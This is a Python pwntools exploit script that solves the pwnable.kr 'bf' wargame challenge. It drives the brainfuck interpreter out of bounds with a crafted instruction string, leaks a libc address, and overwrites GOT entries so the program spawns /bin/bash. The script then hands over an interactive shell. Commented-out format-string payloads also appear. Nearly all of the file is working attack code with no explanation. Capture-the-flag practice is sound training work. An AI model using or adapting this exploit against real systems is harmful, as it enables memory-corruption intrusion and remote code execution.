#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack
from sys import *


# count = 0
conn = remote("pwnable.kr", 9001)
# conn = process('./bf')


# Welcome message
# front_line = conn.recvuntil("\n")


# payload = "A"+ p32(addr) + "%13$0251c" + "%7$hhn"
payload = "<"*144 + ".>"*4+ "<"*4 + ">"*28 +",>"*4 + "<"*32 + ",>"*4 + "<"*8 + ">"*36+ ",>"*4 + "."
#python -c 'print 144*"<" + ".>"*4+ "<"*4 + ">"*28 +",>"*4 + "<"*32 + ",>"*4 +
#"<"*8 + ">"*36+ ",>"*4 + ".\n" + "\x00\xe3\xe6\xf7" + "\x40\x73\xe4\xf7" +"\x71\x86\x04\x08" +"ls"' > input
# payload = "B" + p32(addr) + "%08x.%08x.%08x.%08x.%08x.%n"
# print len(payload)

log.info('Sending payload:' + payload)
conn.sendline(payload)
conn.recvuntil("\n")
conn.recvuntil("\n")
addr = conn.recvn(4)

log.info('Variable is at:' + addr.encode('hex'))
addr = int(addr.encode('hex'), 16)
addr = int(hex(addr)[2::].decode('hex')[::-1].encode('hex'), 16)
# print addr
# addr_memset = addr - 0x61090+0x62300
# addr_fg  = addr - 0x61090+0x3b340

addr_memset = addr - 0x5d540+0x5e770
addr_fg  = addr - 0x5d540+0x3a920
mm = 0x08048671
print hex(addr_memset)
print hex(addr_fg)
print hex(mm)
conn.send(p32(addr_memset))
conn.send(p32(addr_fg))
conn.send(p32(mm))
conn.sendline("/bin/bash")
# conn.sendline("ls")
conn.interactive()
# conn.close()
